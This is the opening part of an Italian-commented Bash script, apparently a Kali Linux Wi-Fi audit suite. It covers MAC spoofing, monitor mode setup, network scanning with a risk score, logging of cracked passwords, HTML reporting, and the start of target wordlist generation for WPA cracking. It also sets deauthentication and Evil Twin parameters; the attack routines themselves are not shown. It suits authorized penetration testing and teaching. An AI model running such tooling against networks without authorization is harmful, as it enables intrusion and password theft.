#!/usr/bin/env bash
# ==================================================================
#  wifiaudit.sh v5.5 - Suite completa di audit Wi-Fi (Kali Linux)
#  Ispirato a: davidpereiracib/WiFi_Audit (report, risk score, MAC)
#  Didattica: premi ? in qualsiasi menu per la spiegazione
#  Config: sole assegnazioni KEY=value; niente shell, source o espansioni generiche.
#  Output: session_*/ contiene log/report/risultati; passwords.tsv in radice è cumulativo.
#  TSV: 7 colonne (timestamp, BSSID, ESSID, fonte, engine, valore, tipo).
#  Escape TSV: backslash=\\, TAB=\t, LF=\n, CR=\r. Nessuna migrazione distruttiva.
#  I record John ambigui restano in john_show_*.txt senza importazione automatica.
#  Il log conserva output/errori dei tool; non è un trace completo di ogni comando Bash.
#  Metodi: Handshake | PMKID | WPS | WEP | Evil Twin | Enterprise
#  Uso: sudo ./wifiaudit.sh [--help]
# ==================================================================
#
#  CHANGELOG v5.4 -> v5.5
#  Recupero offline automatico da menu/CLI, budget globale e per tentativo.
#  Wordlist/regole/maschere, potfile privati e report degli esiti.
#  Nessuna acquisizione radio aggiunta al percorso automatico.
#
#  CHANGELOG v5.3 -> v5.4
#  Menu iniziale senza root, wizard batch e pannello parametri con spiegazioni.
#  Configurazione salvabile in formato dati, diagnostica esportabile da menu.
#
#  CHANGELOG v5.2 -> v5.3
#  --doctor: inventario locale strumenti/versioni/interfacce, senza root o rete.
#  --self-test: controlli puri senza file, hardware o dipendenze di audit.
#  Modalità diagnostiche esclusive; nessuna configurazione caricata.
#
#  CHANGELOG v5.1 -> v5.2
#  Avvio senza effetti per --help/errori CLI; config dati senza source/eval.
#  Nessun pkill globale o stop di NetworkManager; rollback modifiche proprie.
#  Sessioni isolate, TSV con tipo/escape, log senza valori segreti espliciti.
#  John: output ambiguo conservato, non interpretato come password valida.
#  Verifica: test locali con comandi simulati; hardware Kali non verificato.
#
#  CHANGELOG storico v5.0 -> v5.1
#   W. passwords.tsv: log persistente delle password trovate
#   X. extract_passwords_from_show: parser di john --show / hashcat --show
#   Y. Report HTML: sezione "Risultati della sessione" + counter in cima
#   Z. html_escape: escaping per sicurezza nel report
# ==================================================================

set -uo pipefail

# ========================= CONFIG DEFAULT =========================
WORDLIST="/usr/share/wordlists/rockyou.txt"
OUTDIR="$HOME/wifiaudit_results"
MON_IFACE=""
SCAN_TIME=25
DEAUTH_COUNT=5
DEAUTH_ROUNDS=3
DEAUTH_WAIT=30
HASHCAT_MODE=22000
CRACK_ENGINE="auto"
JOHN_RULES="best64"
JOHN_MODE="wordlist"
JOHN_MASK="?u?l?l?l?l?d?d?d"
HC_MASK="?u?l?l?l?l?d?d?d"
JOHN_SESSION="wifiaudit"
GEN_WORDLIST="auto"

TARGET_BSSID=""; TARGET_CHAN=""; TARGET_ESSID=""
FP_ENC=""; FP_WPS=""
METHOD=""
CLI_MODE=""
AUTO_INPUT=""
AUTO_SECONDS_CLI=""
AUTO_SECONDS=600
AUTO_STEP_SECONDS=120
AUTO_USE_MASK="yes"
STARTUP_MON_IFACE=""
LOG_FILE=""
PASSWORDS_FILE=""
ARCHIVE_FILE=""
RESULTS_ROOT=""
SESSION_ID=""
MONITOR_STARTED=0
ORIGINAL_IP_FORWARD=""
NAT_ADDED=0; FORWARD_ADDED=0; AP_ADDR_ADDED=0
AP_WAS_UP=1
CLEANED_UP=0
declare -A CHILD_START=() ORIGINAL_MAC=()
REPORT_HTML="no"

EVILTWIN_AP=""
EVILTWIN_INT=""

SCRIPT_PATH=$(readlink -f "${BASH_SOURCE[0]}")
SCRIPT_DIR=$(dirname "$SCRIPT_PATH")
CONFIG_FILE="${WIFIAUDIT_CONF:-$HOME/.config/wifiaudit/wifiaudit.conf}"

# ========================= COLORI / LOG ==========================
if [[ ! -t 1 ]]; then
  R=; G=; Y=; C=; B=; N=
else
  R='\033[1;31m'; G='\033[1;32m'; Y='\033[1;33m'; C='\033[1;36m'; B='\033[1;34m'; N='\033[0m'
fi

log(){
  local msg="[$(date +%H:%M:%S)] $1"
  if [[ -n "${LOG_FILE:-}" ]]; then
    printf '%s\n' "$msg" >> "$LOG_FILE" 2>/dev/null || true
  fi
  printf '%s\n' "$msg" >&2
}
info(){ log "${C}[*]${N} $1"; }
ok(){   log "${G}[+]${N} $1"; }
warn(){ log "${Y}[!]${N} $1"; }
err(){  log "${R}[-]${N} $1"; }
edu(){  log "${B}[?]IMPARA${N} $1"; }

declare -a CHILD_PIDS=()
track(){
  local pid="${1:-}"
  [[ "$pid" =~ ^[0-9]+$ && -r "/proc/$pid/stat" ]] || return 1
  CHILD_PIDS+=("$pid")
  CHILD_START[$pid]=$(awk '{print $22}' "/proc/$pid/stat")
}
stop_child(){
  local pid="${1:-}" current
  [[ -n "$pid" && -n "${CHILD_START[$pid]:-}" ]] || return 0
  current=$(awk '{print $22}' "/proc/$pid/stat" 2>/dev/null) || current=""
  if [[ "$current" == "${CHILD_START[$pid]}" ]]; then
    kill "$pid" 2>/dev/null || true
    local attempt
    for attempt in {1..20}; do
      [[ -r "/proc/$pid/stat" ]] || break
      [[ "$(awk '{print $3}' "/proc/$pid/stat" 2>/dev/null)" != Z ]] || break
      sleep 0.1
    done
    current=$(awk '{print $22}' "/proc/$pid/stat" 2>/dev/null) || current=""
    [[ "$current" != "${CHILD_START[$pid]}" ]] || kill -KILL "$pid" 2>/dev/null || true
    wait "$pid" 2>/dev/null || true
  fi
  unset 'CHILD_START[$pid]'
}
# Log dei comandi di gestione del sistema; non usare per argomenti segreti.
run(){
  local command_text rc
  printf -v command_text '%q ' "$@"
  info "CMD: $command_text"
  if [[ -n "$LOG_FILE" ]]; then
    "$@" > >(tee -a "$LOG_FILE") 2> >(tee -a "$LOG_FILE" >&2)
    rc=$?
  else
    "$@"; rc=$?
  fi
  (( rc == 0 )) || warn "Comando terminato con stato $rc: ${1:-?}"
  return "$rc"
}

safe_name(){ printf '%s\n' "${1//[^a-zA-Z0-9_-]/_}"; }

# [v5.5-Z] Escape HTML per campi dinamici nel report
html_escape(){
  local s="$1"
  s="${s//&/\&amp;}"
  s="${s//</\&lt;}"
  s="${s//>/\&gt;}"
  s="${s//\"/\&quot;}"
  s="${s//\'/\&#39;}"
  printf '%s' "$s"
}

banner(){
echo -e "${C}
   __      ___ _  __     _  ___  ___  _  _   _   _
   \\ \\    / / | |/ /    /\\| |__ \\|__ \\| || | /_\\ | |
    \\ \\/\\/ /| | ' /    /  \\ |  / /  / /| || |/ _ \\| |
     \\_/\\_/ |_|_|\\_\\  /_/\\ \\| |_| \\ /_/ |__  /_/ \\_\\_|
     v5.5 | HS - PMKID - WPS - WEP - EvilTwin - ENT${N}"
}

# ===================== SAFE SOURCE CONFIG =========================
# Configurazione dati: KEY=value, con virgolette esterne facoltative.
# Nessun eval/source, espansione, comando o escape Bash viene eseguito.
safe_source(){
  local f="$1" path perms owner line key value n=0
  [[ -f "$f" && -r "$f" && ! -L "$f" ]] || return 1
  path=$(readlink -f -- "$f") || return 1
  while :; do
    perms=$(stat -c '%a' -- "$path") || return 1
    owner=$(stat -c '%u' -- "$path") || return 1
    if (( (8#$perms & 8#022) != 0 )) || [[ "$owner" != 0 && "$owner" != "$EUID" ]]; then
      warn "Percorso config non fidato: $path"; return 1
    fi
    [[ "$path" == / ]] && break
    path=$(dirname -- "$path")
  done
  local -A parsed=()
  while IFS= read -r line || [[ -n "$line" ]]; do
    n=$((n+1))
    line="${line#"${line%%[![:space:]]*}"}"
    [[ -z "$line" || "$line" == \#* ]] && continue
    [[ "$line" =~ ^([A-Z_]+)=(.*)$ ]] || { warn "Config: riga $n non valida"; return 1; }
    key="${BASH_REMATCH[1]}"; value="${BASH_REMATCH[2]}"
    value="${value%"${value##*[![:space:]]}"}"
    if [[ "$value" == \"*\" || "$value" == \'*\' ]]; then value="${value:1:${#value}-2}"; fi
    case "$key" in
      WORDLIST|OUTDIR)
        case "$value" in
          '$HOME/'*) value="$HOME/${value:6}" ;;
          '~/'*) value="$HOME/${value:2}" ;;
        esac
        [[ "$value" == /* ]] || { warn "$key richiede un percorso assoluto"; return 1; } ;;
      MON_IFACE) [[ "$value" =~ ^[a-zA-Z0-9_.:-]*$ ]] || return 1 ;;
      SCAN_TIME|DEAUTH_COUNT|DEAUTH_ROUNDS|DEAUTH_WAIT|AUTO_SECONDS|AUTO_STEP_SECONDS) [[ "$value" =~ ^[1-9][0-9]{0,4}$ ]] || return 1 ;;
      HASHCAT_MODE) [[ "$value" =~ ^[0-9]{1,6}$ ]] || return 1 ;;
      CRACK_ENGINE) [[ "$value" =~ ^(auto|john|hashcat)$ ]] || return 1 ;;
      JOHN_MODE) [[ "$value" =~ ^(wordlist|mask|incremental)$ ]] || return 1 ;;
      AUTO_USE_MASK) [[ "$value" =~ ^(yes|no)$ ]] || return 1 ;;
    GEN_WORDLIST) [[ "$value" =~ ^(auto|yes|no)$ ]] || return 1 ;;
      JOHN_SESSION|JOHN_RULES) [[ "$value" =~ ^[a-zA-Z0-9_-]+$ ]] || return 1 ;;
      JOHN_MASK|HC_MASK) ;;
      *) warn "Config: chiave non ammessa $key"; return 1 ;;
    esac
    if [[ -n "$SESSION_ID" && ( "$key" == OUTDIR || "$key" == MON_IFACE ) ]]; then
      warn "$key applicabile solo al prossimo avvio"; continue
    fi
    parsed[$key]="$value"
  done < "$f"
  for key in "${!parsed[@]}"; do printf -v "$key" '%s' "${parsed[$key]}"; done
}

# ===================== PASSWORD TRACKING (v5.5-W) =================
# [v5.5-W] Log persistente: TS \t BSSID \t ESSID \t FONTE \t ENGINE \t PASSWORD
# TSV v2: prime sei colonne storiche + tipo; escape reversibile di \ TAB LF CR.
tsv_escape(){
  local s="$1"
  s="${s//\\/\\\\}"; s="${s//$'\t'/\\t}"
  s="${s//$'\n'/\\n}"; s="${s//$'\r'/\\r}"
  printf '%s' "$s"
}
log_found_password(){
  local label="$1" pwd="$2" source="$3" engine="$4" row ts
  [[ -n "$pwd" ]] || return 0
  [[ -n "$PASSWORDS_FILE" && -n "$ARCHIVE_FILE" ]] || return 1
  ts=$(date '+%Y-%m-%d %H:%M:%S')
  printf -v row '%s\t%s\t%s\t%s\t%s\t%s\t%s' "$ts" \
    "$(tsv_escape "${TARGET_BSSID:--}")" "$(tsv_escape "${TARGET_ESSID:--}")" \
    "$(tsv_escape "$(basename -- "$source")")" "$(tsv_escape "$engine")" \
    "$(tsv_escape "$pwd")" "$(tsv_escape "$label")"
  printf '%s\n' "$row" >> "$PASSWORDS_FILE" || return 1
  # Lock su file per evitare righe interlacciate tra sessioni concorrenti.
  ( flock -x 9 && printf '%s\n' "$row" >&9 ) 9>>"$ARCHIVE_FILE" || return 1
  ok "Risultato $label salvato (engine: $engine); valore disponibile nei file protetti."
}
extract_passwords_from_show(){
  local showfile="$1" source="$2" engine="$3" line pwd label n=0
  [[ -s "$showfile" ]] || return 1
  while IFS= read -r line || [[ -n "$line" ]]; do
    [[ -n "$line" ]] || continue
    case "$engine" in
      hashcat)
        pwd="$line"; label="PASSWORD"
        [[ "$line" != '$HEX['*']' ]] || label="PASSWORD_HEX"
        ;; # --outfile-format 2; autohex conservato senza decodifica distruttiva
      john)
        [[ "$line" == *:* ]] || continue
        # Password e metadati passwd possono contenere ':': non indovinare.
        if [[ "${line#*:}" == *:* ]]; then
          warn "Output John ambiguo: conservato in $showfile, non importato"; continue
        fi
        label="PASSWORD"; pwd="${line#*:}" ;;
      *) return 1 ;;
    esac
    [[ -n "$pwd" ]] || continue
    log_found_password "$label" "$pwd" "$source" "$engine" || return 1
    n=$((n+1))
  done < "$showfile"
  (( n > 0 ))
}

# ===================== DIPENDENZE =================================
DEPS=(airmon-ng airodump-ng aireplay-ng aircrack-ng wpaclean
      hcxdumptool hcxpcapngtool hashcat john reaver crunch
      wash hostapd dnsmasq iptables tshark macchanger)

check_deps(){
  local d missing=()
  for d in "${DEPS[@]}" iw ip timeout flock; do command -v "$d" &>/dev/null || missing+=("$d"); done
  if (( ${#missing[@]} )); then
    err "Dipendenze mancanti: ${missing[*]}"
    warn "Installale esplicitamente prima di avviare una sessione."
    return 1
  fi
  ok "Dipendenze OK"
}

# ===================== MONITOR MODE ===============================
cleanup_network(){
  if (( NAT_ADDED )); then
    if run iptables -t nat -D POSTROUTING -o "$EVILTWIN_INT" -m comment --comment "$SESSION_ID" -j MASQUERADE; then NAT_ADDED=0; fi
  fi
  if (( FORWARD_ADDED )); then
    if run iptables -D FORWARD -i "$EVILTWIN_AP" -m comment --comment "$SESSION_ID" -j ACCEPT; then FORWARD_ADDED=0; fi
  fi
  if (( AP_ADDR_ADDED )); then
    if run ip addr del 10.0.0.1/24 dev "$EVILTWIN_AP"; then AP_ADDR_ADDED=0; fi
  fi
  if [[ -n "$ORIGINAL_IP_FORWARD" ]]; then
    if run sysctl -w "net.ipv4.ip_forward=$ORIGINAL_IP_FORWARD"; then ORIGINAL_IP_FORWARD=""; fi
  fi
  if [[ -n "$EVILTWIN_AP" ]] && (( ! AP_WAS_UP )); then run ip link set "$EVILTWIN_AP" down || true; fi
}
cleanup(){
  local rc=$? p iface
  (( CLEANED_UP )) && return "$rc"
  CLEANED_UP=1
  for p in "${CHILD_PIDS[@]}"; do stop_child "$p"; done
  cleanup_network
  for iface in "${!ORIGINAL_MAC[@]}"; do
    run ip link set "$iface" down || true
    run ip link set "$iface" address "${ORIGINAL_MAC[$iface]}" || true
    run ip link set "$iface" up || true
  done
  if (( MONITOR_STARTED )); then run airmon-ng stop "$MON_IFACE" || true; fi
  info "Sessione terminata (stato $rc)."
  return "$rc"
}

check_iface_monitor(){
  [[ -z "$MON_IFACE" ]] && return 1
  local phy; phy=$(iw dev "$MON_IFACE" info 2>/dev/null | awk '/wiphy/{print $2; exit}')
  if [[ -z "$phy" ]]; then
    warn "Impossibile interrogare $MON_IFACE"
    return 0
  fi
  if iw phy "phy$phy" info 2>/dev/null | grep -q '\* monitor'; then
    ok "Monitor mode supportato su phy$phy"
  else
    warn "phy$phy: monitor mode NON elencato — attacchi potrebbero fallire"
  fi
}

setup_monitor(){
  # Non interrompere NetworkManager o servizi estranei alla sessione.
  if [[ -n "$MON_IFACE" ]] && iw dev "$MON_IFACE" info 2>/dev/null | grep -q "type monitor"; then
    ok "Riutilizzo monitor esistente: $MON_IFACE"; return 0
  fi
  local PHY=""
  if [[ -n "$MON_IFACE" ]]; then
    PHY="${MON_IFACE%mon}"
  else
    PHY=$(iw dev 2>/dev/null | awk '$1=="Interface"{print $2; exit}')
  fi
  [[ -z "$PHY" ]] && { err "Nessuna scheda wireless"; exit 1; }
  run airmon-ng start "$PHY" || return 1
  MONITOR_STARTED=1
  if iw dev "$PHY" info 2>/dev/null | grep -q 'type monitor'; then
    MON_IFACE="$PHY"
  else
    MON_IFACE="${PHY}mon"
  fi
  if ! iw dev 2>/dev/null | awk '$1=="Interface"{print $2}' | grep -qx "$MON_IFACE"; then
    err "Interfaccia $MON_IFACE non rilevata"; return 1
  fi
  ok "Monitor mode: $MON_IFACE"
  check_iface_monitor || true
}

# ===================== CAMBIO MAC ================================
change_mac(){
  local iface="${1:-$MON_IFACE}"
  [[ -z "$iface" ]] && { err "Nessuna interfaccia"; return 1; }
  command -v macchanger &>/dev/null || { err "macchanger non installato"; return 1; }
  local orig
  orig=$(macchanger -s "$iface" 2>/dev/null | awk '/Current MAC/{print $3}')
  info "MAC attuale di $iface: ${orig:-sconosciuto}"
  read -rp "  Cambiare MAC random? [s/N] " c
  [[ "${c,,}" != "s" ]] && return 0
  [[ "$orig" =~ ^([[:xdigit:]]{2}:){5}[[:xdigit:]]{2}$ ]] || { err "MAC originale non leggibile"; return 1; }
  ORIGINAL_MAC[$iface]="${ORIGINAL_MAC[$iface]:-$orig}"
  run ip link set "$iface" down || return 1
  if run macchanger -r "$iface"; then
    run ip link set "$iface" up || true
    ok "MAC cambiato: $(macchanger -s "$iface" 2>/dev/null | awk '/Current MAC/{print $3}')"
  else
    run ip link set "$iface" up || true
    err "Cambio MAC fallito (driver non supporta?)"
    return 1
  fi
}

# ===================== SCANSIONE ==================================
declare -a NETS=()

scan_networks(){
  info "Scansione (${SCAN_TIME}s)..."
  local base="$OUTDIR/scan"; rm -f "$base"-01.csv
  timeout $((SCAN_TIME+5)) airodump-ng "$MON_IFACE" -w "$base" --output-format csv &>/dev/null || true
  local csv="$base-01.csv"; [[ ! -s "$csv" ]] && { err "Scansione vuota"; return 1; }
  : > "$OUTDIR/nets.list"
  echo -e "\n  NUM  ESSID                         BSSID              CH  ENC       PWR"
  echo "  ---  ----------------------------- ------------------ --  -------- ----"
  awk -F', *' -v out="$OUTDIR/nets.list" 'BEGIN{n=0}
    NR>1 && tolower($1) ~ /^([0-9a-f]{2}:){5}[0-9a-f]{2}$/ && NF>13 {
      n++
      essid=$14; gsub(/^ +| +$/,"",essid)
      enc=$6;    gsub(/^ +| +$/,"",enc)
      pwr=$9;    gsub(/^ +| +$/,"",pwr)
      printf "  %-4d %-29s %-18s %-2s %-8s %s\n", n, essid, $1, $4, enc, pwr
      print $1"|"$4"|"essid >> out
    }' "$csv"
  grep -q ',"[^"]*,' "$csv" 2>/dev/null && warn "ESSID con caratteri speciali in $csv"
  NETS=(); mapfile -t NETS < "$OUTDIR/nets.list"; rm -f "$OUTDIR/nets.list"
  analyze_security "$csv"
  edu "PWR vicino a 0 = segnale forte = attacchi affidabili."
  return 0
}

analyze_security(){
  local csv="$1"
  [[ -s "$csv" ]] || { warn "Nessun CSV per l'analisi"; return 1; }
  local total=0 open=0 wep=0 wpa=0 wpa2=0 wpa3=0
  total=$(awk -F',' 'NR>1 && tolower($1) ~ /^([0-9a-f]{2}:){5}[0-9a-f]{2}$/ && NF>13 {n++} END{print n+0}' "$csv")
  open=$(awk -F',' 'NR>1 && tolower($1) ~ /^([0-9a-f]{2}:){5}[0-9a-f]{2}$/ && NF>13 {if ($6 ~ /OPN/) n++} END{print n+0}' "$csv")
  wep=$(awk -F',' 'NR>1 && tolower($1) ~ /^([0-9a-f]{2}:){5}[0-9a-f]{2}$/ && NF>13 {if ($6 ~ /WEP/) n++} END{print n+0}' "$csv")
  wpa=$(awk -F',' 'NR>1 && tolower($1) ~ /^([0-9a-f]{2}:){5}[0-9a-f]{2}$/ && NF>13 {if ($6 ~ /(^|[[:space:]])WPA([[:space:]]|$)/) n++} END{print n+0}' "$csv")
  wpa2=$(awk -F',' 'NR>1 && tolower($1) ~ /^([0-9a-f]{2}:){5}[0-9a-f]{2}$/ && NF>13 {if ($6 ~ /WPA2/) n++} END{print n+0}' "$csv")
  wpa3=$(awk -F',' 'NR>1 && tolower($1) ~ /^([0-9a-f]{2}:){5}[0-9a-f]{2}$/ && NF>13 {if ($6 ~ /WPA3|SAE/) n++} END{print n+0}' "$csv")
  local risk=$(( open*10 + wep*8 + wpa*5 ))
  local level="BASSO"
  (( risk > 50 )) && level="CRITICO"
  (( risk > 20 && risk <= 50 )) && level="ALTO"
  (( risk > 0 && risk <= 20 )) && level="MODERATO"

  SEC_TOTAL=$total; SEC_OPEN=$open; SEC_WEP=$wep; SEC_WPA=$wpa
  SEC_WPA2=$wpa2; SEC_WPA3=$wpa3; SEC_RISK=$risk; SEC_LEVEL=$level

  echo ""
  echo -e "  ${B}--- ANALISI DI SICUREZZA ---${N}"
  printf "  %-20s %d\n" "Reti totali:" "$total"
  printf "  %-20s %d\n" "Aperte (OPN):" "$open"
  printf "  %-20s %d\n" "WEP:" "$wep"
  printf "  %-20s %d\n" "WPA:" "$wpa"
  printf "  %-20s %d\n" "WPA2:" "$wpa2"
  printf "  %-20s %d\n" "WPA3/SAE:" "$wpa3"
  printf "  %-20s %d (%s)\n" "Risk score:" "$risk" "$level"
  if (( open > 0 )); then warn "Reti APERTE: $open — traffico in chiaro"; fi
  if (( wep > 0 )); then warn "Reti WEP: $wep — crackabili in minuti"; fi
  if (( wpa3 > 0 )); then info "Reti WPA3: $wpa3 — attacco classico non applicabile"; fi
}

choose_network(){
  [[ ${#NETS[@]} -eq 0 ]] && { err "Nessuna rete"; return 1; }
  read -rp "  Numero rete (? per spiegare): " idx
  [[ "$idx" == "?" ]] && { help_scan; return 1; }
  [[ "$idx" =~ ^[0-9]+$ ]] || return 1
  [[ "$idx" -ge 1 && "$idx" -le ${#NETS[@]} ]] || { err "Numero fuori range (1-${#NETS[@]})"; return 1; }
  TARGET_BSSID=$(cut -d'|' -f1 <<< "${NETS[$((idx-1))]}")
  TARGET_CHAN=$( cut -d'|' -f2 <<< "${NETS[$((idx-1))]}")
  TARGET_ESSID=$(cut -d'|' -f3 <<< "${NETS[$((idx-1))]}")
  [[ -z "$TARGET_ESSID" ]] && TARGET_ESSID="NASCOSTA"
  ok "Target: $TARGET_ESSID ($TARGET_BSSID) CH $TARGET_CHAN"
}
need_target(){ [[ -z "$TARGET_BSSID" ]] && { warn "Prima scansiona (opz. 1)"; return 1; }; return 0; }
pause(){ read -rp $'\n  [Invio per continuare] ' _ || true; }

# ===================== REPORT HTML (v5.5-Y) =======================
generate_html_report(){
  local report="$OUTDIR/report_$(date +%Y%m%d_%H%M%S).html"
  local csv="$OUTDIR/scan-01.csv"
  if [[ -s "$csv" ]]; then
    analyze_security "$csv" &>/dev/null || return 1
  else
    warn "Report senza scansione: rischio non valutato"
    SEC_TOTAL=0; SEC_OPEN=0; SEC_WEP=0; SEC_WPA=0; SEC_WPA2=0; SEC_WPA3=0
    SEC_RISK="n/d"; SEC_LEVEL="NON_VALUTATO"
  fi

  # Solo risultati di questa sessione; archivio cumulativo separato.
  local pwd_count=0
  [[ -s "$PASSWORDS_FILE" ]] && pwd_count=$(wc -l < "$PASSWORDS_FILE")

  {
    cat <<EOF
<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="utf-8">
<title>WiFi Audit Report — $(date '+%Y-%m-%d %H:%M')</title>
<style>
  body{font-family:system-ui,Segoe UI,Roboto,sans-serif;margin:2rem;background:#f8f9fa;color:#212529}
  h1{border-bottom:3px solid #0d6efd;padding-bottom:.5rem}
  h2{margin-top:2rem;color:#0d6efd}
  table{border-collapse:collapse;width:100%;background:#fff;box-shadow:0 1px 3px rgba(0,0,0,.1)}
  th,td{padding:.6rem 1rem;border-bottom:1px solid #dee2e6;text-align:left}
  th{background:#e9ecef;font-weight:600}
  tr:hover{background:#f1f3f5}
  code{background:#e9ecef;padding:.15rem .4rem;border-radius:3px;font-family:ui-monospace,Consolas,monospace}
  .risk-CRITICO{background:#f8d7da;color:#842029;padding:.5rem;border-radius:4px;font-weight:bold}
  .risk-ALTO{background:#fff3cd;color:#664d03;padding:.5rem;border-radius:4px}
  .risk-MODERATO{background:#d1e7dd;color:#0f5132;padding:.5rem;border-radius:4px}
  .risk-BASSO{background:#cfe2ff;color:#084298;padding:.5rem;border-radius:4px}
  .warn{color:#dc3545;font-weight:600}
  .ok{color:#198754;font-weight:600}
  .badge{display:inline-block;padding:.2rem .6rem;border-radius:12px;font-size:.85rem;font-weight:600}
  .badge-ok{background:#d1e7dd;color:#0f5132}
  .badge-none{background:#e9ecef;color:#495057}
  .pw{font-family:ui-monospace,Consolas,monospace;font-weight:bold;background:#fff3cd;padding:.15rem .4rem;border-radius:3px}
  .footer{margin-top:3rem;padding-top:1rem;border-top:1px solid #dee2e6;font-size:.85rem;color:#6c757d}
</style>
</head>
<body>
<h1>WiFi Audit Report</h1>
<p><strong>Data:</strong> $(date '+%Y-%m-%d %H:%M:%S') — <strong>Interfaccia:</strong> $(html_escape "${MON_IFACE:-n/d}") — <strong>Risultati della sessione:</strong> <span class="badge $([[ $pwd_count -gt 0 ]] && echo badge-ok || echo badge-none)">$pwd_count</span></p>

<h2>Riepilogo di sicurezza</h2>
<table>
<tr><th>Metrica</th><th>Valore</th></tr>
<tr><td>Reti totali</td><td>${SEC_TOTAL:-0}</td></tr>
<tr><td>Reti aperte (OPN)</td><td class="$(( ${SEC_OPEN:-0} > 0 ))">${SEC_OPEN:-0}</td></tr>
<tr><td>Reti WEP</td><td class="$(( ${SEC_WEP:-0} > 0 ))">${SEC_WEP:-0}</td></tr>
<tr><td>Reti WPA</td><td>${SEC_WPA:-0}</td></tr>
<tr><td>Reti WPA2</td><td>${SEC_WPA2:-0}</td></tr>
<tr><td>Reti WPA3/SAE</td><td>${SEC_WPA3:-0}</td></tr>
<tr><td>Risk score</td><td><span class="risk-${SEC_LEVEL:-BASSO}">${SEC_RISK:-0} — ${SEC_LEVEL:-BASSO}</span></td></tr>
</table>

<h2>Reti rilevate</h2>
<table>
<tr><th>#</th><th>ESSID</th><th>BSSID</th><th>CH</th><th>ENC</th><th>PWR</th></tr>
EOF

    # Righe tabella da nets.list o CSV
    if [[ -s "$OUTDIR/nets.list" ]]; then
      local i=0 bssid chan essid
      while IFS='|' read -r bssid chan essid; do
        i=$((i+1))
        printf '<tr><td>%d</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>—</td></tr>\n' \
          "$i" "$(html_escape "${essid:-NASCOSTA}")" "$(html_escape "$bssid")" "$(html_escape "$chan")" "—"
      done < "$OUTDIR/nets.list"
    elif [[ -s "$csv" ]]; then
      awk -F', *' 'NR>1 && tolower($1) ~ /^([0-9a-f]{2}:){5}[0-9a-f]{2}$/ && NF>13 {
        gsub(/^ +| +$/,"",$14); gsub(/^ +| +$/,"",$6); gsub(/^ +| +$/,"",$9);
        essid=($14==""?"NASCOSTA":$14);
        gsub(/&/,"\\&amp;",essid); gsub(/</,"\\&lt;",essid); gsub(/>/,"\\&gt;",essid);
        printf "<tr><td>%d</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td></tr>\n",
          ++n, essid, $1, $4, $6, $9
      }' "$csv"
    else
      echo '<tr><td colspan="6">Nessuna scansione disponibile; rischio non valutato.</td></tr>'
    fi

    cat <<EOF
</table>

<h2>Handshake / catture</h2>
<table>
<tr><th>File</th><th>Dimensione</th><th>Stato</th></tr>
EOF
    local found=0 f sz status
    while IFS= read -r -d '' f; do
      found=1
      sz=$(stat -c%s "$f" 2>/dev/null || echo 0)
      status="da verificare"
      # Il controllo dimensionale non dimostra la validità crittografica.
      printf '<tr><td>%s</td><td>%s byte</td><td>%s</td></tr>\n' \
        "$(html_escape "$(basename "$f")")" "$sz" "$status"
    done < <(find "$OUTDIR" -maxdepth 1 -name '*.cap' -print0 2>/dev/null)
    [[ $found -eq 0 ]] && echo '<tr><td colspan="3">Nessuna cattura trovata</td></tr>'

    # [v5.5-Y] Sezione password trovate
    cat <<EOF
</table>

<h2>🔑 Risultati della sessione</h2>
EOF
    if [[ -s "$PASSWORDS_FILE" ]]; then
      cat <<EOF
<table>
<tr><th>Quando</th><th>BSSID</th><th>ESSID</th><th>Fonte</th><th>Engine</th><th>Tipo</th><th>Valore (escape TSV)</th></tr>
EOF
      local ts bssid essid source engine pw kind
      while IFS=$'\t' read -r ts bssid essid source engine pw kind; do
        printf '<tr><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td><span class="pw">%s</span></td></tr>\n' \
          "$(html_escape "$ts")" \
          "$(html_escape "$bssid")" \
          "$(html_escape "$essid")" \
          "$(html_escape "$source")" \
          "$(html_escape "$engine")" \
          "$(html_escape "${kind:-PASSWORD}")" \
          "$(html_escape "$pw")"
      done < "$PASSWORDS_FILE"
      echo '</table>'
      echo '<p class="warn">⚠️ Materiale sensibile: non condividere questo report con persone non autorizzate.</p>'
    else
      echo '<p class="ok">Nessuna password trovata (le catture potrebbero non essere ancora state crackate).</p>'
    fi

    cat <<EOF

<h2>Raccomandazioni</h2>
<ul>
EOF
    (( ${SEC_OPEN:-0} > 0 )) && echo '<li><span class="warn">Disabilitare reti aperte</span> — usare WPA2/WPA3.</li>'
    (( ${SEC_WEP:-0} > 0 )) && echo '<li><span class="warn">Migrare da WEP</span> — crackabile in minuti.</li>'
    (( ${SEC_WPA:-0} > 0 )) && echo '<li>Aggiornare reti WPA a WPA2/WPA3.</li>'
    (( ${SEC_WPA3:-0} == 0 )) && echo '<li>Considerare WPA3/SAE per le nuove reti.</li>'
    echo '<li>Disattivare WPS su tutti i router (Pixie Dust / brute force).</li>'
    echo '<li>Usare password robuste (14+ caratteri, no pattern noti).</li>'
    echo '<li>Aggiornare regolarmente il firmware degli AP.</li>'

    cat <<EOF
</ul>
<div class="footer">
Report generato da wifiaudit.sh v5.5 — uso esclusivamente su reti autorizzate.<br>
Password log: $(html_escape "$PASSWORDS_FILE") — contiene materiale sensibile.
</div>
</body>
</html>
EOF
  } > "$report"

  chmod 600 "$report" 2>/dev/null || true
  ok "Report HTML: $report"
  echo "$report"
}

# Il sorgente v5.1 richiamava fingerprint_ap senza definirla.
# Diagnostica locale: WPS rimane sconosciuto senza un risultato verificato.
fingerprint_ap(){
  FP_ENC=""; FP_WPS=""
  local csv="$OUTDIR/scan-01.csv"
  if [[ -s "$csv" ]]; then
    FP_ENC=$(awk -F',' -v b="$TARGET_BSSID" 'tolower($1)==tolower(b) {print $6; exit}' "$csv")
  fi
  info "Cifratura osservata: ${FP_ENC:-sconosciuta}; stato WPS non verificato"
  [[ "$FP_ENC" != *WPA3* && "$FP_ENC" != *SAE* ]] || warn "WPA3/SAE rilevato: test classici WPA2 non validati per questa rete"
}

# ===================== WORDLIST MIRATA ============================
generate_target_wordlist(){
  [[ "$GEN_WORDLIST" == "no" ]] && return 1
  local essid="$1" file="$OUTDIR/target_wordlist.txt"
  local base="${essid//[^a-zA-Z0-9]/}"
  [[ -z "$base" ]] && return 1
  local blen=${#base}
  (( blen < 2 || blen > 12 )) && return 1

  info "Genero wordlist mirata da '$essid'..."
  printf '%s\n' "$base" "${base^^}" "${base^}" "${base,,}" \
    "${base}123" "${base}1234" "${base}!" "${base}2023" "${base}2024" \
    "${base}2025" "${base}2026" > "$file"

  local extra tlen pattern
